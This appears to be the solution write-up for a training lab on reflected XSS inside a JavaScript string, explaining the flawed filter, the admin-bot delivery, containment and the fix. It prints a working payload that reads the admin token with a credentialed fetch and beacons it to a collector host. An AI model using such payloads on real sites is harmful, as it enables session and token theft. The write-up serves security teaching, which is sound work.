# Solution — Reflected XSS in a JavaScript String Literal

**Vulnerability class: CWE-79 (Improper Neutralization of Input During Web Page
Generation) / OWASP A03:2021 – Injection.**

## The sink

`GET /` builds an inline `<script>` by string concatenation, dropping the
`?promo` value straight into a single-quoted JS string literal:

```python
def _strip_angles(value):        # the "sanitiser"
    return value.replace("<", "").replace(">", "")

body = PAGE_PRE + _strip_angles(raw) + PAGE_POST
# ... PAGE_PRE ends with:  var promo = '
# ... PAGE_POST starts with: ';
```

So the rendered script is:

```js
var promo = '<FILTERED>';
document.getElementById('promo').innerText = promo;
```

`_strip_angles` removes `<` and `>` — an **HTML** defence. But the injection
point is **inside a JavaScript string**, and nothing in that context cares about
angle brackets. Single quotes and backslashes reach the page untouched:

```
GET /?promo=a'b   →   var promo = 'a'b';    (the quote is live, not &#39;)
GET /?promo=<i>   →   var promo = 'i';       (angle brackets simply vanish)
```

The wrong encoder was applied for the context — the essence of this lab.

## The delivery model

You cannot read the admin's cookie or token from your own browser; the
same-origin policy scopes both to whoever loads the page. You need the **admin's**
browser to run your JavaScript. `POST /report` is exactly that capability: it
queues a same-site path, and the admin bot visits it every ~2s while logged in.

Once your code runs in the admin's session, a **same-origin** `fetch` carries the
admin cookie automatically, so `/api/whoami` will disclose the admin `token` to
your script even though it refuses it to your own requests.

## The payload

Goes in `?promo` (URL-encoded). It contains **no angle brackets** — none are
needed here, and any `<`/`>` would be stripped. Note the deliberate choice of
`function(){...}` expressions instead of `=>` arrows: an arrow contains `>`, so
`r=>r.text()` would be mangled into `r=r.text()` by the filter. This is a nice
demonstration that the filter _does_ remove those characters — it is just
removing the wrong ones for the context, and the attacker simply routes around
them:

```js
';fetch('/api/whoami',{credentials:'include'})
  .then(function(r){return r.text()})
  .then(function(t){new Image().src=
      'http://collector:9000/report?w='+encodeURIComponent(t)});//
```

Substituted into the sink it reads:

```js
var promo = '';
fetch('/api/whoami', { credentials: 'include' })
  .then(function (r) {
    return r.text();
  })
  .then(function (t) {
    new Image().src = 'http://collector:9000/report?w=' + encodeURIComponent(t);
  }); //';
document.getElementById('promo').innerText = promo;
```

- The leading `'` closes the empty string (`promo = ''`).
- `;` ends that statement; the `fetch(...)` then runs as top-level code.
- `credentials:'include'` sends the admin cookie on the same-origin call, so
  `/api/whoami` returns `{"user":"admin","token":"<32 hex>"}`.
- `new Image().src = …` fires a cross-origin GET beacon (image loads are not
  subject to the same-origin _read_ barrier — the request still goes out, which
  is all we need) to the in-lab collector.
- The trailing `//` comments out the leftover `';` so the script stays
  syntactically valid and no error aborts execution.

## End-to-end

```
POST /report   {"url":"/?promo=%27%3Bfetch(%27/api/whoami%27%2C%7Bcredentials%3A%27include%27%7D)...%2F%2F"}
# wait for the bot to visit (~2s)
GET  /oob/received      # app-side proxy to the collector; find /report?w=%7B%22user%22%3A%22admin%22...%7D
POST /solve    {"c":"<32 hex token>"}     →  FLAG{...}
```

`tests/exploit.py` automates this: confirm the JS-string context (a quote
survives, an angle bracket is stripped) → submit → poll `/oob/received` → parse
the 32-hex token out of the captured whoami JSON → `/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true`
  — **no route off the host**. The exfiltrated token can reach the in-lab
  collector but never the internet, so the lab can ship a real exfil primitive at
  `risk: low`.
- `/internal/bot-login` (mints the admin cookie) and `/internal/queue` are
  firewalled to the backend subnet **and** the login is gated by a `BOT_KEY`, so
  a lab visitor on the public side cannot request the admin cookie or read the
  queue directly. The reflected-XSS path is the only way to obtain the token.

## The fix

**The root fix is context-aware output encoding, not a bigger blacklist.**

1. **Encode for the JavaScript-string context.** Do not hand-concatenate
   untrusted data into a script. Serialise it as JSON and let the JSON encoder
   escape quotes, backslashes and `</`:

   ```python
   import json
   # server side — emit a safe literal
   script = "var promo = %s;" % json.dumps(promo)   # json.dumps quotes+escapes
   ```

   or, better, keep the value out of code entirely: put it in a data attribute /
   `textContent` and read it with `el.dataset.promo`, so it is never parsed as
   script. Either way `'` becomes `'` (or a quoted JSON string) and the
   break-out is impossible.

2. **Prefer framework auto-escaping and stop blacklisting characters.** Stripping
   `<`/`>` is an HTML measure applied to a JS context — the wrong encoder. A
   character blacklist is the wrong tool; a context-correct encoder is the right
   one.

Defence in depth that also blunts this exact chain: a strict
`Content-Security-Policy` with no `unsafe-inline` would stop the inline script
executing at all, and `HttpOnly` on the session cookie would blunt a
`document.cookie` variant (though _not_ the `/api/whoami` fetch used here — which
is precisely why encoding, not the cookie flag, is the primary fix). CSP is
explored in later labs.

## Platform note — catalog deviation

The reference framing for "reflected XSS into a JavaScript string" is a
Node/Express app. This lab is **re-platformed to Flask (Python 3.12 /
gunicorn)** per the project's Flask-default Hybrid policy, so the whole XSS track
shares one runtime, one hardened container posture, and the one shared
`@websec-lab/xss-verifier` headless-Chromium victim bot. **The lesson is
framework-independent:** an inline `<script>` that concatenates untrusted input
into a JS string literal, "protected" only by an HTML angle-bracket filter, is
the identical vulnerability whether the server is Express or Flask — the sink is
the string literal, not the language that emitted it.
